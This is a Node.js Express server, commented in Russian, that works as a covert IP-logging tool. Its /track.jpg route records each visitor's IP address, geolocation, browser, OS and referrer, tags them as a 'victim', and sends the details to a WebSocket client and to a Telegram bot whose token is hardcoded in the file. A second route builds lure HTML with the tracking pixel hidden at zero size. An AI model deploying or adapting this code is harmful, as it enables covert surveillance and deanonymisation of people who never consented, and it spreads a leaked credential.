const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Telegram конфиг
const TELEGRAM_TOKEN = '8652352513:AAGCxb8tQydzu0WhMf1sFQXjmmBOm7zFnn0';
const TELEGRAM_CHAT_ID = '8652352513';

// Хранилище WebSocket клиентов
const clients = new Set();

// 1x1 пиксель
const PIXEL = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

// WebSocket соединение
wss.on('connection', (ws) => {
    console.log('[+] Python client connected');
    clients.add(ws);
    
    ws.on('close', () => {
        clients.delete(ws);
        console.log('[-] Python client disconnected');
    });
});

// Отправка данных всем клиентам
function broadcastVictimData(data) {
    const message = JSON.stringify(data);
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    });
}

// Отправка в Telegram
async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch(e) {}
}

// Геолокация
async function getGeoLocation(ip) {
    if (ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
        return { country: 'Local', city: 'Local', isp: 'Local Network' };
    }
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        return response.data;
    } catch(e) {
        return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
    }
}

// Парсинг User-Agent
function parseUserAgent(ua) {
    if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
    return {
        browser: ua.includes('Firefox') ? 'Firefox' : 
                  ua.includes('Chrome') ? 'Chrome' :
                  ua.includes('Safari') ? 'Safari' : 'Other',
        os: ua.includes('Windows') ? 'Windows' :
            ua.includes('Mac') ? 'macOS' :
            ua.includes('Android') ? 'Android' :
            ua.includes('iPhone') ? 'iOS' : 'Other',
        device: ua.includes('Mobile') ? 'Mobile' : 'Desktop'
    };
}

// Главный маршрут для трекинга
app.get('/track.jpg', async (req, res) => {
    // Получаем IP
    let ip = req.headers['x-forwarded-for']?.split(',')[0] || 
             req.socket.remoteAddress ||
             req.ip;
    ip = ip?.replace('::ffff:', '');
    
    // Получаем реферер
    const referer = req.headers['referer'] || 'direct';
    let website = 'direct';
    if (referer !== 'direct') {
        try {
            const url = new URL(referer);
            website = url.hostname;
        } catch(e) {}
    }
    
    // Парсим User-Agent
    const ua = req.headers['user-agent'] || 'unknown';
    const uaInfo = parseUserAgent(ua);
    
    // Геолокация
    const geo = await getGeoLocation(ip);
    
    // Формируем данные для отправки
    const victimData = {
        ip: ip,
        country: geo.country || 'Unknown',
        city: geo.city || 'Unknown',
        region: geo.regionName || 'Unknown',
        isp: geo.isp || 'Unknown',
        lat: geo.lat || 0,
        lon: geo.lon || 0,
        website: website,
        referer: referer,
        userAgent: ua,
        browser: uaInfo.browser,
        os: uaInfo.os,
        device: uaInfo.device,
        timestamp: new Date().toISOString(),
        acceptLanguage: req.headers['accept-language'] || 'Unknown'
    };
    
    // Отправляем через WebSocket Python клиенту
    broadcastVictimData(victimData);
    
    // Отправляем в Telegram
    const telegramMsg = `
🔍 <b>NEW VICTIM</b>
━━━━━━━━━━━━━━━━━━━━━
🌐 IP: <code>${ip}</code>
📍 Location: ${geo.city}, ${geo.country}
🏢 ISP: ${geo.isp}
💻 Browser: ${uaInfo.browser}
🖥️ OS: ${uaInfo.os}
📱 Device: ${uaInfo.device}
🌍 Source: ${website}
⏰ Time: ${new Date().toLocaleString()}
    `;
    await sendToTelegram(telegramMsg);
    
    // Сохраняем в файл
    
    console.log(`[+] Victim: ${ip} | ${geo.country} | ${website}`);
    
    // Отправляем пиксель
    res.set('Content-Type', 'image/gif');
    res.send(PIXEL);
});

// Маршрут для генерации страницы Telegraph
app.post('/create-page', express.json(), async (req, res) => {
    const { title, description, imageUrl } = req.body;
    
    // Генерируем HTML
    const html = `
        <h1>${title}</h1>
        <p>${description}</p>
        <img src="${imageUrl}" style="display:none">
        <img src="${imageUrl}" width="0" height="0">
    `;
    
    // Здесь можно создать Telegraph страницу через API
    res.json({ success: true, html: html });
});

server.listen(3000, '0.0.0.0', () => {
    console.log(`
[+] Express server on http://0.0.0.0:3000
[+] WebSocket on ws://0.0.0.0:3000
[+] Tracking endpoint: /track.jpg
    `);
});